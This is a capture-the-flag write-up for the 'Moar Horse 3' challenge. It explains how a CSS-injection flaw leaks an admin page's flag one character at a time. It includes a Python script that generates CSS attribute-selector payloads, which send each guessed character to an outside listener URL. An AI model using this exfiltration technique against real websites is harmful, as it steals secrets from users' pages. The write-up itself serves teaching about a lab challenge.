# Moar Horse 3
### Forensics: 100 points
#### Solved by: Vermillion
```
Written by okulkarni
```
`I copped this really cool `<a href='https://moar_horse_3.tjctf.org/'>website</a> `from online and made it customizable so you can flex your CSS skills on everyone, especially the admin.`
```
Note: When you get the flag, wrap it in tjctf{} before submitting
```
When I opened the website, its design was horrible, of course on purpose. I don't have an image of how it looked during competition, but that doesn't matter. The website (now) looks like this:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/567457247609880688/unknown.png">

Clearly, it appears to be some sort of CSS injection. The first thing I did was enter random text to see what would happen, and found that it added a new style tag to the html. I tried some ideas of my own, like closing out the style tag, but none of it worked. But then I saw this:

<img src='https://cdn.discordapp.com/attachments/532350033241309226/567458807953752082/unknown.png'>

Clearly, if I pressed the 'show admin' button, the value of the h1 tag would be the flag. But how do I pull that from my side? So I turned to Google, searching 'css injection ctf'.

I found this <a href='https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d'>site</a> and wrote up my exploit using it. I had originally used Heroku to receive the requests, but switched to a listening site built by a ctf-er.

My exploit wrote a python script to generate an injection for all possible alphanumeric characters in this format:
```
h1[value^=(insertflagcharactershere)]{
    background-image: url(https://weastie.com/l/tkf6/letter=(letterimtryinghere));
}
```
This would send a request to the listener site `https://weastie.com/l/tkf6/letter=` followed by a letter if said letter was the next letter in the flag characters. When it started, I would have one such block for each letter, having `value^=` followed by said letter. Once I figured out the first letter, I would append that to `value^=` and continue trying more characters.

I wrote a python script to generate my injection:
```
#https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d
text1 = 'h1[value^=l0l1nj3ctc' #The flag that I had gotten up until I guesed the rest
text2 = ''']{
    background-image: url(https://weastie.com/l/tkf6/letter='''
text3 = ''');
}'''

import string
for char in string.ascii_letters+string.digits:
	print text1+char+text2+char+text3
```
And it gave an ouput with my full injection, which I copied and pasted into the textbox. An excerpt is below:

<img src='https://cdn.discordapp.com/attachments/532350033241309226/567459953086955520/unknown.png'>

After spastically spamming the Refresh button, I eventually got a request for each letter. An example is below:

<img src='https://cdn.discordapp.com/attachments/532350033241309226/567460720606838803/unknown.png'>

I slowly bashed out each letter in this manner, until I got the string `l0l1nj3ctc`, and I guessed that the flag was l0l1nj3ctc55. And it was! Nice.

flag: `tjctf{l0l1nj3ctc55}`

Note: It's really important to read the medium link that I used so you can understand my code a bit better. Also, a lot of these picturs I get after the competition, so that's why the listener url is different.
